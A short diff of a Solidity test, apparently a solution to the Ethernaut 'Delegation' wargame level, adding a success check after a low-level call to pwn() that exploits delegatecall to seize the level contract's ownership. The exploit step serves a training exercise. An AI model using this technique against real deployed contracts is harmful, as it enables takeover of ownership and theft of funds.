@@ -29,6 +29,7 @@ contract DelegationTest is StdCheats, Test {
         // LEVEL ATTACK //
         //////////////////
         (bool success,) = address(ethernautDelegation).call(abi.encodeWithSignature("pwn()"));
+        require(success, "");
 
         //////////////////////
         // LEVEL SUBMISSION //
